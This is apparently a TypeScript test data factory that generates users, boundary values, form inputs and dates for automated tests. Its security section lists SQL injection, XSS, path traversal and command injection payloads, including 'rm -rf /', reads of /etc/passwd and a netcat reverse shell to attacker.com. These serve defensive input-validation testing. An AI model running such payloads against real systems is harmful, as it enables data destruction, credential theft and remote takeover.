/**
 * Test Data Factory
 * Generates test data for various scenarios
 * 
 * Note: For more dynamic data, install @faker-js/faker:
 * npm install @faker-js/faker --save-dev
 * 
 * Then uncomment the faker imports and implementations below.
 */

// Uncomment when faker is installed:
// import { faker } from '@faker-js/faker';

/**
 * User data interface
 */
export interface UserData {
  email: string;
  password: string;
  firstName?: string;
  lastName?: string;
}

/**
 * Generate a random string of specified length
 */
function randomString(length: number, charset = 'abcdefghijklmnopqrstuvwxyz'): string {
  let result = '';
  for (let i = 0; i < length; i++) {
    result += charset.charAt(Math.floor(Math.random() * charset.length));
  }
  return result;
}

/**
 * Generate a random number between min and max
 */
function randomNumber(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

/**
 * Generate a unique ID
 */
function uniqueId(): string {
  return `${Date.now()}-${randomString(6)}`;
}

/**
 * Test Data Factory
 * Provides methods to generate various types of test data
 */
export const TestDataFactory = {
  /**
   * User-related test data
   */
  user: {
    /**
     * Generate a valid user with random email
     */
    valid(): UserData {
      const id = uniqueId();
      return {
        email: `testuser-${id}@example.com`,
        password: `SecurePass${randomNumber(100, 999)}!`,
        firstName: `User${randomString(4)}`,
        lastName: `Test${randomString(4)}`,
      };
    },

    /**
     * Generate a user with weak password
     */
    withWeakPassword(): UserData {
      return {
        email: `weakpass-${uniqueId()}@example.com`,
        password: '123',
      };
    },

    /**
     * Generate a user with very long credentials
     */
    withLongCredentials(): UserData {
      return {
        email: `${'a'.repeat(100)}@${'b'.repeat(50)}.com`,
        password: 'p'.repeat(200),
      };
    },

    /**
     * Generate a user with special characters in email
     */
    withSpecialCharsEmail(): UserData {
      return {
        email: `test+special.chars_${uniqueId()}@example.com`,
        password: 'ValidPass123!',
      };
    },

    /**
     * Generate a user with unicode characters
     */
    withUnicode(): UserData {
      return {
        email: `user-${uniqueId()}@example.com`,
        password: 'Pässwörd123!日本語',
        firstName: 'Tëst',
        lastName: 'Üsér',
      };
    },
  },

  /**
   * Security testing payloads
   */
  security: {
    /**
     * SQL injection test payloads
     */
    sqlInjection: [
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "' UNION SELECT * FROM users--",
      "admin'--",
      "' OR 1=1--",
      "1'; UPDATE users SET password='hacked'--",
      "' OR ''='",
      "1 OR 1=1",
      "' OR 'x'='x",
    ],

    /**
     * XSS test payloads
     */
    xss: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "<body onload=alert('XSS')>",
      "<iframe src='javascript:alert(1)'>",
      "'\"><script>alert('XSS')</script>",
      "<div onmouseover=\"alert('XSS')\">hover me</div>",
    ],

    /**
     * Command injection payloads
     */
    commandInjection: [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '; rm -rf /',
      '| nc -e /bin/sh attacker.com 1234',
    ],

    /**
     * Path traversal payloads
     */
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
  },

  /**
   * Boundary value test data
   */
  boundary: {
    /**
     * Empty values
     */
    empty: {
      string: '',
      array: [],
      object: {},
    },

    /**
     * Whitespace values
     */
    whitespace: {
      single: ' ',
      multiple: '   ',
      tabs: '\t\t',
      newlines: '\n\n',
      mixed: ' \t\n ',
    },

    /**
     * Numeric boundaries
     */
    numbers: {
      zero: 0,
      negative: -1,
      maxSafe: Number.MAX_SAFE_INTEGER,
      minSafe: Number.MIN_SAFE_INTEGER,
      float: 0.1 + 0.2, // Classic floating point edge case
    },

    /**
     * String lengths
     */
    strings: {
      oneChar: 'a',
      veryLong: 'a'.repeat(10000),
      maxReasonable: 'a'.repeat(255),
    },
  },

  /**
   * Form input test data
   */
  formInputs: {
    /**
     * Invalid email formats
     */
    invalidEmails: [
      'notanemail',
      '@missinglocal.com',
      'missing@.com',
      'missing@domain',
      'spaces in@email.com',
      'double@@at.com',
      '.startswithdot@email.com',
      'endswith.@email.com',
    ],

    /**
     * Valid email formats (edge cases)
     */
    validEmailEdgeCases: [
      'simple@example.com',
      'very.common@example.com',
      'disposable.style.email.with+symbol@example.com',
      'other.email-with-hyphen@example.com',
      'fully-qualified-domain@example.com',
      'user.name+tag+sorting@example.com',
      'x@example.com', // one-letter local-part
      'example-indeed@strange-example.com',
    ],

    /**
     * Phone number formats
     */
    phoneNumbers: {
      valid: ['+1-234-567-8900', '(123) 456-7890', '123.456.7890'],
      invalid: ['123', 'abc-def-ghij', '++1234567890'],
    },
  },

  /**
   * Date/time test data
   */
  dates: {
    /**
     * Get various date formats
     */
    formats: {
      iso: new Date().toISOString(),
      locale: new Date().toLocaleDateString(),
      timestamp: Date.now(),
    },

    /**
     * Edge case dates
     */
    edgeCases: {
      leapYear: new Date('2024-02-29'),
      endOfYear: new Date('2024-12-31'),
      startOfYear: new Date('2024-01-01'),
      epochStart: new Date(0),
    },
  },

  /**
   * Utility methods
   */
  utils: {
    randomString,
    randomNumber,
    uniqueId,

    /**
     * Pick a random item from an array
     */
    randomFrom<T>(array: T[]): T {
      return array[Math.floor(Math.random() * array.length)];
    },

    /**
     * Generate array of N items using generator function
     */
    generateMany<T>(count: number, generator: () => T): T[] {
      return Array.from({ length: count }, generator);
    },
  },
};

/**
 * Shorthand exports for common operations
 */
export const generateValidUser = TestDataFactory.user.valid;
export const getSQLInjectionPayloads = (): string[] => TestDataFactory.security.sqlInjection;
export const getXSSPayloads = (): string[] => TestDataFactory.security.xss;

